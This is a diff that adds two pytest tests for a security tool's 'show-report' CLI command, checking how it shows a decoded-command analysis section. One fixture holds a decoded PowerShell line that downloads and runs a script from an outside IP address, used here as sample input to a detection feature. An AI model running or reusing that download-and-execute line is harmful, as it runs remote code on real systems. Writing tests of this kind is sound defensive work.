@@ -481,6 +481,43 @@ def test_show_report_command_prints_human_readable_detail(monkeypatch):
     assert "no MITRE ATT&CK mapping available for this alert" in result.stdout
 
 
+def test_show_report_command_omits_command_analysis_section_when_absent(monkeypatch):
+    report = _make_report()
+    store = _FakeAlertStore(reports=[report])
+    monkeypatch.setattr("app.cli.build_alert_store", lambda settings: store)
+
+    result = runner.invoke(app, ["show-report", str(report.report_id)])
+
+    assert result.exit_code == 0
+    assert "Command analysis:" not in result.stdout
+
+
+def test_show_report_command_prints_command_analysis_section_when_present(monkeypatch):
+    from app.schemas import CommandDecodeResult, DecodedSegment
+
+    command_analysis = CommandDecodeResult(
+        command_line="powershell.exe -EncodedCommand AAA",
+        decoded_segments=[
+            DecodedSegment(
+                encoding="powershell_encoded",
+                original="AAA",
+                decoded="IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.1/a.ps1')",
+            )
+        ],
+    )
+    report = _make_report(command_analysis=command_analysis)
+    store = _FakeAlertStore(reports=[report])
+    monkeypatch.setattr("app.cli.build_alert_store", lambda settings: store)
+
+    result = runner.invoke(app, ["show-report", str(report.report_id)])
+
+    assert result.exit_code == 0
+    assert "Command analysis:" in result.stdout
+    assert "powershell.exe -EncodedCommand AAA" in result.stdout
+    assert "[powershell_encoded]" in result.stdout
+    assert "185.220.101.1" in result.stdout
+
+
 def test_show_report_command_json_output(monkeypatch):
     report = _make_report()
     store = _FakeAlertStore(reports=[report])
